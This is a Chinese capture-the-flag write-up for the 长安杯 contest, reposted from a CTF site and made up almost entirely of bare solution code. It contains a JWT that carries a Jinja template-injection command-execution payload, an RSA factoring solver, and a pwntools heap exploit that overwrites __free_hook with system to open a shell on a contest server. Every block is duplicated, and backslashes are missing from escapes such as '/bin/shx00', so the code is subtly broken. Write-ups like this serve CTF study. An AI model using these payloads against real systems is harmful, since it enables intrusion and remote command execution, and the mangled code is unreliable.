# 长安杯-WriteUp

> 原文: https://www.ctfiot.com/1069.html
> ID: 1069

Web

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoie3t1cmxfZm9yLl9fZ2xvYmFsc19fLm9zLnBvcGVuKHJlcXVlc3QuYXJncy5jbWQpLnJlYWQoKX19IiwicGFzc3dkIjoiMTIzIiwicm9sZSI6ImFkbWluIiwidWlkIjoiIn0.KWHbwpGOiRZvRZxbdibiqK5C636QHuVnhUHVz_CDYD0

Crypto

from Crypto.Util.number import *
# from secret import flag

def add(a,b):
    if(a<b):
        a0 = str(b).encode()
        b0 = str(a).encode()
    else:
        a0 = str(a).encode()
        b0 = str(b).encode()
    ans = 0
    # b0 < a0
    for i in range(len(a0)-len(b0)):
        ans = ans*10+a0[i]-48
    for i in range(len(b0)):
        ans = ans*10+(a0[i+len(a0)-len(b0)]+b0[i]+4)%10
    return ans

def mul(a,b):
    if(a<b):
        a0 = str(b).encode()
        b0 = str(a).encode()
    else:
        a0 = str(a).encode()
        b0 = str(b).encode()
    ans = 0
    for i in range(len(b0)):
        ans = ans*10+((a0[i+len(a0)-len(b0)]+2)*(b0[i]+2))%10
    return ans

def collect(m):
    res = []
    while m:
        res.append(m%10)
        m //= 10
    res = res[::-1]
    return res

def solve(a,b):
    x_add_y = (a-4)%10
    x_mul_y = (b+4-2*a)%10
    ans = []
    for x in range(48,58):
        for y in range(48,58):
            if (x+y)%10 == x_add_y and (x*y)%10 == x_mul_y:
                ans.append((x-48,y-48))
    return ans

e = 65537

n = 100457237809578238448997689590363740025639066957321554834356116114019566855447194466985968666777662995007348443263561295712530012665535942780881309520544097928921920784417859632308854225762469971326925931642031846400402355926637518199130760304347996335637140724757568332604740023000379088112644537238901495181
p_add_q = 10399034381787849923326924881454040531711492204619924608227265350044149907274051734345037676383421545973249148286183660679683016947030357640361405556516408
p_mul_q = 6004903250672248020273453078045186428048881010508070095760634049430058892705564009054400328070528434060550830050010084328522605000400260581038846465000861
info1 = (collect(p_add_q))
info2 = (collect(p_mul_q))
guess = [0]
info1 = info1[1:]
cnt = 1
ans = 0
ans_p = [0]
ans_q = [0]
for i in range(len(info1)-1,-1,-1):
    a = info1[i]
    b = info2[i]
    poss = solve(a,b)
    print(poss)
    pp_ans = []
    qq_ans = []
    for index in range(len(ans_p)):

        pp = ans_p[index]
        qq = ans_q[index]
        for x, y in poss:
            print(x,y)
            nans_p = pp+x*(10**(cnt-1))
            nans_q = qq+y*(10**(cnt-1))
            print("cur",nans_p,nans_q)
            if (nans_p * nans_q)%(10**cnt) == n%(10**cnt):
                pp_ans.append(nans_p)
                qq_ans.append(nans_q)
                print("yes!!!",pp_ans,qq_ans)
                print("qq_ans",qq_ans)
                print("pp_ans",pp_ans)
                # break
    if pp_ans:
        ans_p = pp_ans
        ans_q = qq_ans
    print("ans",ans_p,ans_q)

    cnt += 1

from Crypto.Util.number import *
for p in ans_p:
    if isPrime(p):
        print(p)

p = 8307103755174226983699771812499382664784661030503034013965679561410051699975573257899430944515587916063550418050690024796566861042630720583592848475010689
q = n//p
phi = (p-1)*(q-1)
d = inverse(65537,phi)
c = 49042009464540753864186870038605696433949255281829439530955555557471951265762643642510403828448619593655860548966001304965902133517879714352191832895783859451396658166132732818620715968231113019681486494621363269268257297512939412717227009564539512793374347236183475339558666141579267673676878540943373877937

print(long_to_bytes(pow(c,d,n))

Pwn

from pwn import *
sh=remote('113.201.14.253',21111)
libc=ELF('libc-2.27.so')
context(arch='amd64', os='linux')
context.log_level='debug'

def add(idx,size,con):
    sh.recvuntil('>>')
    sh.sendline('1')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
    sh.recvuntil('size?')
    sh.sendline(str(size))
    sh.recvuntil('content?')
    sh.send(con)
def delete(idx):
    sh.recvuntil('>>')
    sh.sendline('2')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
def edit(idx,size,con):
    sh.recvuntil('>>')
    sh.sendline('3')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
    sh.recvuntil('size?')
    sh.sendline(str(size))
    sh.recvuntil('content?')
    sh.send(con)
def show(idx):
    sh.recvuntil('>>')
    sh.sendline('4')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
add(0,0x28,'a')
add(1,0x400,'a')
add(2,0x68,'a')
add(3,0x68,'a')
add(4,0x50,'/bin/shx00')
sh.recvuntil('>>')
sh.sendline('1')
sh.recvuntil('idx?')
sh.sendline('0')
sh.recvuntil('size?')
sh.sendline('-1')

edit(0,0x10000,p64(0)*5+p64(0x411+0x70*2))
delete(1)
add(1,0x400,'a')
show(2)
libc.address=u64(sh.recvuntil('x7f')[-6:].ljust(8,'x00'))-96-libc.sym['__malloc_hook']-0x10
print hex(libc.address)
delete(3)
add(1,0x90,0x68*'x00'+p64(0x71)+p64(libc.sym['__free_hook']))
add(2,0x60,'a')
add(2,0x60,p64(libc.sym['system']))
delete(4)
sh.interactive()

Reverse

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoie3t1cmxfZm9yLl9fZ2xvYmFsc19fLm9zLnBvcGVuKHJlcXVlc3QuYXJncy5jbWQpLnJlYWQoKX19IiwicGFzc3dkIjoiMTIzIiwicm9sZSI6ImFkbWluIiwidWlkIjoiIn0.KWHbwpGOiRZvRZxbdibiqK5C636QHuVnhUHVz_CDYD0
```



```
from Crypto.Util.number import *
# from secret import flag

def add(a,b):
    if(a<b):
        a0 = str(b).encode()
        b0 = str(a).encode()
    else:
        a0 = str(a).encode()
        b0 = str(b).encode()
    ans = 0
    # b0 < a0
    for i in range(len(a0)-len(b0)):
        ans = ans*10+a0[i]-48
    for i in range(len(b0)):
        ans = ans*10+(a0[i+len(a0)-len(b0)]+b0[i]+4)%10
    return ans

def mul(a,b):
    if(a<b):
        a0 = str(b).encode()
        b0 = str(a).encode()
    else:
        a0 = str(a).encode()
        b0 = str(b).encode()
    ans = 0
    for i in range(len(b0)):
        ans = ans*10+((a0[i+len(a0)-len(b0)]+2)*(b0[i]+2))%10
    return ans

def collect(m):
    res = []
    while m:
        res.append(m%10)
        m //= 10
    res = res[::-1]
    return res

def solve(a,b):
    x_add_y = (a-4)%10
    x_mul_y = (b+4-2*a)%10
    ans = []
    for x in range(48,58):
        for y in range(48,58):
            if (x+y)%10 == x_add_y and (x*y)%10 == x_mul_y:
                ans.append((x-48,y-48))
    return ans

e = 65537

n = 100457237809578238448997689590363740025639066957321554834356116114019566855447194466985968666777662995007348443263561295712530012665535942780881309520544097928921920784417859632308854225762469971326925931642031846400402355926637518199130760304347996335637140724757568332604740023000379088112644537238901495181
p_add_q = 10399034381787849923326924881454040531711492204619924608227265350044149907274051734345037676383421545973249148286183660679683016947030357640361405556516408
p_mul_q = 6004903250672248020273453078045186428048881010508070095760634049430058892705564009054400328070528434060550830050010084328522605000400260581038846465000861
info1 = (collect(p_add_q))
info2 = (collect(p_mul_q))
guess = [0]
info1 = info1[1:]
cnt = 1
ans = 0
ans_p = [0]
ans_q = [0]
for i in range(len(info1)-1,-1,-1):
    a = info1[i]
    b = info2[i]
    poss = solve(a,b)
    print(poss)
    pp_ans = []
    qq_ans = []
    for index in range(len(ans_p)):

        pp = ans_p[index]
        qq = ans_q[index]
        for x, y in poss:
            print(x,y)
            nans_p = pp+x*(10**(cnt-1))
            nans_q = qq+y*(10**(cnt-1))
            print("cur",nans_p,nans_q)
            if (nans_p * nans_q)%(10**cnt) == n%(10**cnt):
                pp_ans.append(nans_p)
                qq_ans.append(nans_q)
                print("yes!!!",pp_ans,qq_ans)
                print("qq_ans",qq_ans)
                print("pp_ans",pp_ans)
                # break
    if pp_ans:
        ans_p = pp_ans
        ans_q = qq_ans
    print("ans",ans_p,ans_q)

    cnt += 1

from Crypto.Util.number import *
for p in ans_p:
    if isPrime(p):
        print(p)

p = 8307103755174226983699771812499382664784661030503034013965679561410051699975573257899430944515587916063550418050690024796566861042630720583592848475010689
q = n//p
phi = (p-1)*(q-1)
d = inverse(65537,phi)
c = 49042009464540753864186870038605696433949255281829439530955555557471951265762643642510403828448619593655860548966001304965902133517879714352191832895783859451396658166132732818620715968231113019681486494621363269268257297512939412717227009564539512793374347236183475339558666141579267673676878540943373877937

print(long_to_bytes(pow(c,d,n))
```



```
from pwn import *
sh=remote('113.201.14.253',21111)
libc=ELF('libc-2.27.so')
context(arch='amd64', os='linux')
context.log_level='debug'

def add(idx,size,con):
    sh.recvuntil('>>')
    sh.sendline('1')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
    sh.recvuntil('size?')
    sh.sendline(str(size))
    sh.recvuntil('content?')
    sh.send(con)
def delete(idx):
    sh.recvuntil('>>')
    sh.sendline('2')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
def edit(idx,size,con):
    sh.recvuntil('>>')
    sh.sendline('3')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
    sh.recvuntil('size?')
    sh.sendline(str(size))
    sh.recvuntil('content?')
    sh.send(con)
def show(idx):
    sh.recvuntil('>>')
    sh.sendline('4')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
add(0,0x28,'a')
add(1,0x400,'a')
add(2,0x68,'a')
add(3,0x68,'a')
add(4,0x50,'/bin/shx00')
sh.recvuntil('>>')
sh.sendline('1')
sh.recvuntil('idx?')
sh.sendline('0')
sh.recvuntil('size?')
sh.sendline('-1')

edit(0,0x10000,p64(0)*5+p64(0x411+0x70*2))
delete(1)
add(1,0x400,'a')
show(2)
libc.address=u64(sh.recvuntil('x7f')[-6:].ljust(8,'x00'))-96-libc.sym['__malloc_hook']-0x10
print hex(libc.address)
delete(3)
add(1,0x90,0x68*'x00'+p64(0x71)+p64(libc.sym['__free_hook']))
add(2,0x60,'a')
add(2,0x60,p64(libc.sym['system']))
delete(4)
sh.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/3-1634875230.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/0-1634875230.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/8-1634875230.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/1-1634875230.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/7-1634875231.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/1-1634875231.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/5-1634875231.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/3-1634875232.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/10-1634875232.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/6-1634875233.png)